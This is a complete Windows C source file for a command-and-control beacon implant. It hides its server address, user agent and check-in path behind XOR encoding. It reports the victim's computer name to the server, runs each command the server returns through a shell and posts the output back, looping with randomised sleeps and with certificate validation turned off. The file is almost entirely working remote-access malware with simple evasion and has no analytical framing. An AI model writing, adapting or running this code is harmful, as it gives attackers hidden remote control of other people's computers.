#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#pragma comment(lib, "wininet.lib")


HINTERNET hInternet;
HINTERNET hConnect;
HINTERNET hOpen;
BOOL hSend;
BOOL hRead;
char buffer[4096];
char response[4096];
char* executeCommand(char* cmd);
DWORD bytesRead;
char sizeCompname[MAX_PATH];
char beaconID[9];
void sendOutput(char* output);

char ip[]       = {0x64, 0x67, 0x62, 0x7B, 0x65, 0x7B, 0x65, 0x7B, 0x64, 0x00}; 
char brow[]     = {0x18, 0x3A, 0x2F, 0x3C, 0x39, 0x39, 0x34, 0x7A, 0x60, 0x7B, 0x65, 0x00};
char check[]    = {0x7A, 0x36, 0x3D, 0x30, 0x36, 0x3E, 0x3C, 0x3B, 0x00};
char cmd_sleep[] = {0x26, 0x39, 0x30, 0x30, 0x25, 0x00};

char* getCompname() {
    DWORD dwSize = MAX_PATH;
    GetComputerNameA(sizeCompname, &dwSize);
    return sizeCompname;   
}

void generateID() {
    char charset[] = "0123456789ABCDEF";
    for (int i = 0; i < 8; i++) {
        beaconID[i] = charset[rand() % 16];
    }
    beaconID[8] = '\0';
}

void xorString(char* str, char key, int len) {
    for (int i = 0; i < len; i++)
        str[i] = str[i] ^ key;
}

int beacon() {
    xorString(ip,        0x55, sizeof(ip)        - 1);
    xorString(brow,      0x55, sizeof(brow)      - 1);
    xorString(check,     0x55, sizeof(check)     - 1);
    xorString(cmd_sleep, 0x55, sizeof(cmd_sleep) - 1);

    memset(response, 0, sizeof(response));

    char* hostname = getCompname();
    char postData[256];
    sprintf(postData, "id=%s&hostname=%s", beaconID, hostname);

    hInternet = InternetOpen(brow, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed: %lu\n", GetLastError());
        return 1;
    }

    hConnect = InternetConnect(hInternet, ip, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) {
        printf("InternetConnect failed: %lu\n", GetLastError());
        return 1;
    }

    hOpen = HttpOpenRequest(hConnect, "POST", check, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hOpen == NULL) {
        printf("HttpOpenRequest failed: %lu\n", GetLastError());
        return 1;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    InternetSetOption(hOpen, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    hSend = HttpSendRequest(hOpen, NULL, -1L, postData, strlen(postData));
    if (hSend == FALSE) {
        printf("HttpSendRequest failed: %lu\n", GetLastError());
        return 1;
    }

    do {
        hRead = InternetReadFile(hOpen, buffer, sizeof(buffer), &bytesRead);
        strncat(response, buffer, bytesRead);
    } while (bytesRead > 0);

    printf("%s", response);

    if (strncmp(response, cmd_sleep, strlen(cmd_sleep)) != 0) {
        char* result = executeCommand(response);
        sendOutput(result);
    }

    xorString(ip,        0x55, sizeof(ip)        - 1);
    xorString(brow,      0x55, sizeof(brow)      - 1);
    xorString(check,     0x55, sizeof(check)     - 1);
    xorString(cmd_sleep, 0x55, sizeof(cmd_sleep) - 1);

    return 0;
}

char* executeCommand(char* cmd) {
    static char output[4096];
    memset(output, 0, sizeof(output));
    
    FILE* fp = _popen(cmd, "r");
    if (fp == NULL) return "popen failed";

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        strncat(output, line, sizeof(output) - strlen(output) - 1);
    }

    _pclose(fp);
    return output;
}

void sendOutput(char* output) {
    HINTERNET hIntOut, hConOut, hReqOut;
    BOOL hSendOut;

    hIntOut = InternetOpen(brow, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hIntOut == NULL) {
        printf("InternetOpen failed: %lu\n", GetLastError());
        return;
    }

    hConOut = InternetConnect(hIntOut, ip, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConOut == NULL) {
        printf("InternetConnect failed: %lu\n", GetLastError());
        return;
    }

    hReqOut = HttpOpenRequest(hConOut, "POST", check, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hReqOut == NULL) {
        printf("HttpOpenRequest failed: %lu\n", GetLastError());
        return;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    InternetSetOption(hReqOut, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    hSendOut = HttpSendRequest(hReqOut, NULL, -1L, output, strlen(output));
    if (hSendOut == FALSE) {
        printf("HttpSendRequest failed: %lu\n", GetLastError());
        return;
    }

    InternetCloseHandle(hReqOut);
    InternetCloseHandle(hConOut);
    InternetCloseHandle(hIntOut);
}

int main() {
    srand(time(NULL));
    generateID();
    printf("%s", executeCommand("whoami \n"));

    while (1) {
        beacon();
        printf(" Sleep for random milliseconds.\n");
        Sleep(5000 + rand() % 10000);
        printf("Slept for random milliseconds.\n");
    }
}
